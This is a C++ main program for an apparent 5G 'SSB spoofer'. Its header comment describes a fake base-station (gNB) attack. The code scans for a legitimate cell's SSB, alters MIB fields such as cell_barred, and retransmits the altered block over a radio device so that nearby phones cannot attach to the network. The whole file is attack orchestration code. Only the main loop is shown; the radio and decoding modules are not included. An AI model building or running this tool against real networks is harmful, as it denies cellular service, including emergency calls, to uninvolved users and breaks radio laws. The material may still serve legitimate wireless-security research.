/**
 * SSB Spoofer Main Application
 * 
 * This application performs a fake gNB attack by:
 * 1. Scanning for a legitimate SSB from a target gNB
 * 2. Decoding the MIB from the SSB
 * 3. Modifying key MIB parameters (cell_barred, coreset0_idx, etc.)
 * 4. Re-encoding and transmitting the modified SSB
 * 
 * This causes UE misconfiguration and prevents network attachment.
 */

#include "config.h"
#include "rf_handler.h"
#include "ssb_processor.h"
#include "app_core.h"

#include <iostream>
#include <vector>
#include <csignal>

using namespace ssb_spoofer;

int main(int argc, char** argv) {
  // Print banner
  print_banner();
  
  // Parse command line arguments
  std::string config_file = "config.yaml";
  
  for (int i = 1; i < argc; i++) {
      std::string arg = argv[i];
      if (arg == "-h" || arg == "--help") {
      print_usage(argv[0]);
      return 0;
      } else if (arg == "-c" || arg == "--config") {
      if (i + 1 < argc) {
          config_file = argv[++i];
      } else {
          std::cerr << "Error: -c option requires an argument" << std::endl;
          return 1;
      }
      } else {
      std::cerr << "Error: Unknown option " << arg << std::endl;
      print_usage(argv[0]);
      return 1;
      }
  }
  
  // Setup signal handlers
  std::signal(SIGINT, signal_handler);
  std::signal(SIGTERM, signal_handler);
  
  // Load configuration
  std::cout << "\n  >> Loading configuration from: " << config_file << std::endl;
  Config config;
  if (!ConfigParser::load_from_file(config_file, config)) {
      std::cerr << "  ERROR: Failed to load configuration" << std::endl;
      return 1;
  }
  
  ConfigParser::print(config);
  
  // Initialize RF handler
  std::cout << "\n  --------------------------------------------------------" << std::endl;
  std::cout << "            Initializing RF Device" << std::endl;
  std::cout << "  --------------------------------------------------------"   << std::endl;
  RfHandler rf;
  if (!rf.init(config.rf)) {
      std::cerr << "  ERROR: Failed to initialize RF device" << std::endl;
      return 1;
  }
  
  // Initialize SSB processor
  std::cout << "\n  --------------------------------------------------------" << std::endl;
  std::cout << "            Initializing SSB Processor" << std::endl;
  std::cout << "  --------------------------------------------------------"   << std::endl;
  SsbProcessor ssb_proc;
  if (!ssb_proc.init(config.ssb, config.rf.srate_hz, config.rf.rx_freq_hz)) {
      std::cerr << "  ERROR: Failed to initialize SSB processor" << std::endl;
      return 1;
  }
  
  // Scan for target SSB
  SsbSearchResult ssb_result;
  if (!scan_for_ssb(rf, ssb_proc, config, ssb_result)) {
      std::cerr << "\n  --------------------------------------------------------" << std::endl;
      std::cerr << "            Failed to find target SSB" << std::endl;
      std::cerr << "  --------------------------------------------------------"   << std::endl;
      std::cerr << "    Suggestions:" << std::endl;
      std::cerr << "    - Check RF configuration (frequency, gain, etc.)"         << std::endl;
      std::cerr << "    - Verify target gNB is transmitting" << std::endl;
      std::cerr << "    - Try increasing scan duration" << std::endl;
      std::cerr << "  --------------------------------------------------------"   << std::endl;
      return 1;
  }
  
  // Transmit spoofed SSB
  if (!transmit_spoofed_ssb(rf, ssb_proc, config, ssb_result)) {
      std::cerr << "  ERROR: Failed to transmit spoofed SSB" << std::endl;
      return 1;
  }
  

  std::cout << "\n\n  ======================================================================" << std::endl;
  std::cout <<     "                     Attack Execution Complete" << std::endl;
  std::cout <<     "  ======================================================================" << std::endl;
  std::cout << "\n";
  
  return 0;
}
